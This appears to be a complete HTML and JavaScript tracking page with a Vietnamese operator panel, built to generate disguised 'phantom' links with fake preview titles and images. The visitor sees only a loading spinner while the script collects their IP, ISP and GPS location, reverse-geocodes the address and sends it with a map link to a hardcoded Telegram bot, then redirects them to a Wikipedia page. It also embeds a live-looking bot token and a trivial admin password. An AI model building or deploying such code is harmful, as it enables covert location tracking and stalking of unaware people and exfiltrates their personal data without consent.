<body id="main-body" class="victim-body">

    <div id="ui-victim">
        <div class="loader" style="margin: 0 auto;"></div>
        <div class="mt-4 text-[#777] text-sm text-center italic">Vui l√≤ng ch·ªù gi√¢y l√°t...</div>
    </div>

    <div id="ui-admin" class="hidden w-full p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-gray-800 pb-4">
                <h1 class="text-xl font-black text-white italic uppercase">V·ªä TR√ç</h1>
                <button onclick="logout()" class="text-[10px] bg-red-900/20 text-red-500 px-3 py-1 rounded border border-red-500/30">LOGOUT</button>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">
                <div class="lg:col-span-5 space-y-6">
                    <div class="glass p-5 space-y-4 shadow-2xl">
                        <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest italic border-b border-gray-800 pb-2">1. C·∫•u h√¨nh Ng·ª•y trang (Full Edit)</h3>
                        <div class="space-y-3">
                            <input id="ed-title" type="text" placeholder="Ti√™u ƒë·ªÅ trang (Title)" class="input-dark" oninput="updateUI()">
                            <textarea id="ed-desc" placeholder="M√¥ t·∫£ n·ªôi dung" class="input-dark h-16 resize-none" oninput="updateUI()"></textarea>
                            <input id="ed-img" type="text" placeholder="Link ·∫£nh (URL)" class="input-dark" oninput="updateUI()">
                        </div>
                        
                        <div class="preview-card mt-2">
                            <img id="pre-img" src="" class="preview-img">
                            <div class="p-3">
                                <div id="pre-title" class="font-bold text-xs text-blue-800 truncate">...</div>
                                <div id="pre-desc" class="text-[10px] text-gray-500 line-clamp-2 mt-1 italic">...</div>
                            </div>
                        </div>
                    </div>

                    <div class="glass p-5 space-y-4 shadow-2xl">
                        <h3 class="text-[10px] font-black text-green-500 uppercase tracking-widest italic border-b border-gray-800 pb-2">2. Link & Telegram Robot</h3>
                        <div class="grid grid-cols-2 gap-2">
                            <input id="cfg-tk" type="password" placeholder="Bot Token" class="input-dark">
                            <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
                        </div>
                        <input id="cfg-rd" type="text" placeholder="Link ƒë√≠ch chuy·ªÉn h∆∞·ªõng" class="input-dark">
                        <input id="in-name" type="text" placeholder="T√™n m·ª•c ti√™u (Ghi ch√∫)" class="input-dark">
                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase transition-all shadow-lg">T·∫†O LINK PHANTOM</button>
                        
                        <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/30 mt-4">
                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center leading-relaxed"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-7">
                    <div class="glass min-h-[550px] flex flex-col overflow-hidden shadow-2xl">
                        <div class="p-5 border-b border-gray-800 flex justify-between items-center bg-black/20">
                            <h3 class="text-[11px] font-black text-white uppercase italic tracking-widest">Local Session Logs</h3>
                            <button onclick="clearLogs()" class="text-[9px] text-gray-500 hover:text-red-500 uppercase">X√≥a h·∫øt</button>
                        </div>
                        <div class="overflow-x-auto flex-1">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black/50 text-gray-500 uppercase text-[9px]">
                                    <tr><th class="p-4">Target</th><th class="p-4">Network</th><th class="p-4">V·ªã tr√≠ th·ª±c</th><th class="p-4 text-right">Map</th></tr>
                                </thead>
                                <tbody id="log-list" class="divide-y divide-gray-800 text-gray-300">
                                    </tbody>
                            </table>
                        </div>
                        <div class="p-4 bg-yellow-900/10 border-t border-gray-800 text-[9px] text-yellow-600 italic">
                            * L∆∞u √Ω: Do kh√¥ng c√≥ PHP, d·ªØ li·ªáu chi ti·∫øt nh·∫•t s·∫Ω ƒë∆∞·ª£c g·ª≠i tr·ª±c ti·∫øp v·ªÅ Telegram c·ªßa b·∫°n.
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let config = {
            t: "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4",
            i: "857408205",
            r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n",
            mt: "Ti·ªÉu s·ª≠ ƒê·ª©c qu·ªëc c√¥ng ƒê√†o Minh Qu√¢n",
            md: "T·ªôi √°c c·ªông s·∫£n v·ªõi ƒê√†o Minh Qu√¢n v√† c√¥ng ∆°n cao c·∫£ c·ªßa Ng√†i.",
            mi: "https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg"
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                if (localStorage.getItem('v29_auth') === 'true' || prompt("Pass:") === "123") {
                    localStorage.setItem('v29_auth', 'true');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { startPhantom(); }
        };

        // --- TRACKING CORE ---
        async function startPhantom() {
            try { 
                const v = urlParams.get('v'); 
                if(v) config = JSON.parse(decodeURIComponent(escape(atob(v)))); 
                
                // √âP C·∫¨P NH·∫¨T META NGAY L·∫¨P T·ª®C
                document.title = config.mt;
                document.getElementById('dyn-title').innerText = config.mt;
                document.getElementById('meta-desc').content = config.md;
                document.getElementById('og-title').content = config.mt;
                document.getElementById('og-desc').content = config.md;
                document.getElementById('og-img').content = config.mi;
            } catch(e) {}

            const target = urlParams.get('name') || 'GUEST';
            let ipInfo = {};

            // L·∫•y IP & ISP (Silent)
            try {
                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
                ipInfo = { ip: res.ip, org: res.org, city: res.city + ", " + res.country_name, time: new Date().toLocaleTimeString(), st: 'IP' };
                saveLog({ name: target, ...ipInfo, address: ipInfo.city });
                
                await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + target + "</b> ƒëang v√†o link\nüåê IP: " + res.ip + "\nüè¢ ISP: " + res.org)}`);
            } catch(e) {}

            const jump = () => window.location.replace(config.r);

            // √âp GPS & Reverse Geo
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    let fullAddr = `T·ªça ƒë·ªô: ${lat}, ${lon}`;
                    try {
                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                        fullAddr = geo.display_name || fullAddr;
                    } catch(e) {}
                    
                    saveLog({ name: target, ...ipInfo, lat, lon, address: fullAddr, st: 'GPS' });
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + target + "</b> GPS OK\nüìç " + fullAddr + "\nüó∫Ô∏è Map: http://maps.google.com/maps?q=" + lat + "," + lon)}`);
                    jump();
                }, jump, { timeout: 5000 });
            } else { jump(); }
            setTimeout(jump, 8000);
        }

        // --- ADMIN FUNCTIONS ---
        function initAdmin() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            
            const saved = localStorage.getItem('v29_cfg');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('edit-meta-title').value = config.mt;
            document.getElementById('edit-meta-desc').value = config.md;
            document.getElementById('edit-meta-img').value = config.mi;
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            
            updateUI();
            renderLogs();
            setInterval(renderLogs, 3000); // T·ª± ƒë·ªông load nh·∫≠t k√Ω m·ªói 3 gi√¢y
        }

        function updateUI() {
            document.getElementById('pre-title').innerText = document.getElementById('edit-meta-title').value || "...";
            document.getElementById('pre-desc').innerText = document.getElementById('edit-meta-desc').value || "...";
            document.getElementById('pre-img').src = document.getElementById('edit-meta-img').value || "";
        }

        function saveAndBuild() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            config.mt = document.getElementById('edit-meta-title').value;
            config.md = document.getElementById('edit-meta-desc').value;
            config.mi = document.getElementById('edit-meta-img').value;
            localStorage.setItem('v29_cfg', JSON.stringify(config));
            
            const name = document.getElementById('in-name').value || 'Target';
            const base = window.location.href.split('?')[0];
            const v = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
            const link = `${base}?name=${encodeURIComponent(name)}&v=${v}`;
            
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = link;
        }

        function saveLog(data) {
            let logs = JSON.parse(localStorage.getItem('v29_logs') || '[]');
            if (logs.length > 0 && logs[0].name === data.name && data.st === 'GPS') {
                logs[0] = data;
            } else {
                logs.unshift(data);
            }
            localStorage.setItem('v29_logs', JSON.stringify(logs.slice(0, 50)));
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('v29_logs') || '[]');
            const table = document.getElementById('log-list');
            const html = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                    <td class="p-4 font-bold text-white uppercase">${l.name}<br><span class="text-[8px] text-gray-600">${l.time}</span></td>
                    <td class="p-4 text-blue-400 font-mono text-[10px]">${l.ip}</td>
                    <td class="p-4 text-gray-300 text-[9px] max-w-[180px] leading-tight">${l.address || 'ƒêang x√°c ƒë·ªãnh...'}</td>
                    <td class="p-4 text-right">
                        ${l.st === 'GPS' ? `<a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" class="bg-green-600/20 text-green-500 px-2 py-1 rounded font-bold">MAP</a>` : `<span class="text-gray-700 italic">IP</span>`}
                    </td>
                </tr>
            `).join('');
            if (table.innerHTML !== html) table.innerHTML = html;
        }

        function clearLogs() { localStorage.removeItem('v29_logs'); renderLogs(); }
        function logout() { localStorage.removeItem('v29_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy Link!"); }
    </script>
</body>
</html>
